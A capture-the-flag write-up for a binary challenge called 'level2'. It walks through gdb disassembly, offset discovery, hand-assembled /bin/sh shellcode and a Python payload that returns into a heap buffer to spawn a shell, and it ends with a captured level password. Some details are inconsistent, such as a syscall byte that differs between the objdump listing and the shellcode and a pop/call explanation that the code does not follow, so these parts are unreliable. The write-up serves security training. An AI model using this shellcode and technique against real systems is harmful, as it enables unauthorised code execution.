# Level2

	(gdb) disas main
	Dump of assembler code for function main:
	   0x0804853f <+0>:	push   %ebp
	   0x08048540 <+1>:	mov    %esp,%ebp
	   0x08048542 <+3>:	and    $0xfffffff0,%esp
	   0x08048545 <+6>:	call   0x80484d4 <p>
	   0x0804854a <+11>:	leave  
	   0x0804854b <+12>:	ret    
	End of assembler dump.
	(gdb) disas p
	Dump of assembler code for function p:
	   0x080484d4 <+0>:	push   %ebp
	   0x080484d5 <+1>:	mov    %esp,%ebp
	   0x080484d7 <+3>:	sub    $0x68,%esp
	   0x080484da <+6>:	mov    0x8049860,%eax
	   0x080484df <+11>:	mov    %eax,(%esp)
	   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
	   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
	   0x080484ea <+22>:	mov    %eax,(%esp)
	   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
	   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
	   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
	   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
	   0x080484fb <+39>:	and    $0xb0000000,%eax
	   0x08048500 <+44>:	cmp    $0xb0000000,%eax
	   0x08048505 <+49>:	jne    0x8048527 <p+83>
	   0x08048507 <+51>:	mov    $0x8048620,%eax
	   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
	   0x0804850f <+59>:	mov    %edx,0x4(%esp)
	   0x08048513 <+63>:	mov    %eax,(%esp)
	   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
	   0x0804851b <+71>:	movl   $0x1,(%esp)
	   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
	   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
	   0x0804852a <+86>:	mov    %eax,(%esp)
	   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
	   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
	   0x08048535 <+97>:	mov    %eax,(%esp)
	   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
	   0x0804853d <+105>:	leave  
	   0x0804853e <+106>:	ret    
	End of assembler dump.

There is another vulnerable gets() call, but this time there is no useful function to exploit.

However, the stack is protected against buffer overflow, there is a check here that will exit if the memory has been overwritten :

	0x080484fb <+39>:	and    $0xb0000000,%eax
	0x08048500 <+44>:	cmp    $0xb0000000,%eax

This means we won't be able to overflow the stack. But there is also a call to strdup, which uses malloc, so the value will be stored in the heap.
We can place a breakpoint after the strdup call to get the pointer address, located in the EAX register (return value) :

	(gdb) run
	Starting program: /home/user/level2/level2 abc
	AAAAAAAAAAAA
	AAAAAAAAAAAA

	[...]

	Breakpoint 2, 0x0804853d in p ()
	(gdb) info registers
	eax            0x804a008        134520840
	ecx            0x0      0
	edx            0xbffff6cc       -1073744180
	ebx            0xb7fd0ff4       -1208152076
	esp            0xbffff6b0       0xbffff6b0
	ebp            0xbffff718       0xbffff718
	esi            0x0      0
	edi            0x0      0
	eip            0x804853d        0x804853d <p+105>
	eflags         0x200286 [ PF SF IF ID ]
	cs             0x73     115
	ss             0x7b     123
	ds             0x7b     123
	es             0x7b     123
	fs             0x0      0
	gs             0x33     51
	(gdb) x $eax
	0x804a008:      0x41414141

The address 0x804a008 indeed contains our input string.

We also need to find the buffer size

	$ msf-pattern_create -l100
	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Now we just have to find the pattern stored in the registers :

	(gdb) info register
	[...]
	ebp            0x63413563       0x63413563 <-- cA5c in ASCII
	esi            0x0      0
	edi            0x0      0
	eip            0x37634136       0x37634136 <-- 7cA6 in ASCII
	[...]

EBP:

	$ msf-pattern_offset -q c5Ac
	[*] Exact match at offset 76

EIP:

	$ msf-pattern_offset -q 6Ac7
	[*] Exact match at offset 80

We can overflow the EIP register with the 81-84th characters of the buffer, by overwriting the address of the strdup return value. And this address will contain our own code that will run a shell, effectively executing it. Since the strdup address is located in the heap, the stack will be untouched.

Here our malicious asm code that will use the pop/call technique:

	global	_start
	section	.text
	
	_start:
		; set registers to NULL
		xor	eax, eax
		xor	ebx, ebx
		xor	ecx, ecx
		xor	edx, edx
	
		push	edx		; push NULL

		; We need to push /bin/sh on the stack using a x86 architecture. So we need to push 4 bytes at a time, and in little endian number
		; /bin/sh is only 7 bytes so we add another /  (we need 2x 4 bytes)
		push	0x68732f6e	; hs/n
		push	0x69622f2f	; ib// (1)
		
		mov	ebx, esp
		push	edx ; push NULL (2)
		
		push	ebx ; push string address (3)
		
		mov	ecx, esp ; (4)
		mov	al, 11 ; syscall number of execve
		int	0x80

This is how the stack will look like after executing our code :

	   +------------------------+
	   |        //bin/sh        |<-+	(1)
	   +------------------------+  |
	   |         edx = 0        |  |	(2)
	   +------------------------+  |
	+->|   ebx = addr str       |--+	(3)
	|  +------------------------+
	|  |            0           |<-- null pointer for the string termination
	|  +------------------------+
	+--| ecx = addr addr str    |		(4)
	   +------------------------+

[source](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Les%20shellcodes.pdf)

In order to get the address of a string, we first need to push it to the stack. The pop/call technique consists of the following: we start from an address X, jumping to a label at address Y, below which there is a call to the instruction following X. And below this call is our string. During the call, the address of the next instruction will be pushed onto the stack, as with all calls. The next address is precisely the address of our string. All we have to do is pop the address into a register, in this case ECX

We can then compile our naughty code and dissassemble it :

	$ objdump -d shellcode

	shellcode:     file format elf32-i386


	Disassembly of section .text:

	08049000 <_start>:
	8049000:	31 c0                	xor    %eax,%eax
	8049002:	31 db                	xor    %ebx,%ebx
	8049004:	31 c9                	xor    %ecx,%ecx
	8049006:	31 d2                	xor    %edx,%edx
	8049008:	52                   	push   %edx
	8049009:	68 6e 2f 73 68       	push   $0x68732f6e
	804900e:	68 2f 2f 62 69       	push   $0x69622f2f
	8049013:	89 e3                	mov    %esp,%ebx
	8049015:	52                   	push   %edx
	8049016:	53                   	push   %ebx
	8049017:	89 e1                	mov    %esp,%ecx
	8049019:	b0 dd                	mov    $0xdd,%al
	804901b:	cd 80                	int    $0x80

Dissassembling it allows us to get the opcodes (the machine code of the asm instructions), separating them with \x.
To do so, we can use a small script. I am a lazy dude though, so i will instead write them by hand. Here is our shellcode :

	\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80

Now, we just need to pass this shellcode to the binary. At the same time, we also need to overwrite EIP with the malloc'd string address. To do so, our string needs to be 80 characters long + the last 4 characters to overflow EIP. Since our shellcode is (fortunately) shorter than 80 characters, we can add some padding until we reach 80 characters. I would recommend using 'Y' because it's such an underrated letter in my opinion, but any character will do the job.

Here is our final payload :

	$ echo $((($(cat shellcode.txt | wc -c) - 1)/4))
	29 <-- shellcode len, so we need a padding of 51
	$ python -c 'print "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"+"Y"*51+"\x44\x84\x04\x08"+"\x08\xa0\x04\x08"' > payload
	$ cat payload - | ./level2 
	[...]
	id
	uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
	cd ../level3
	cat .pass
	492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
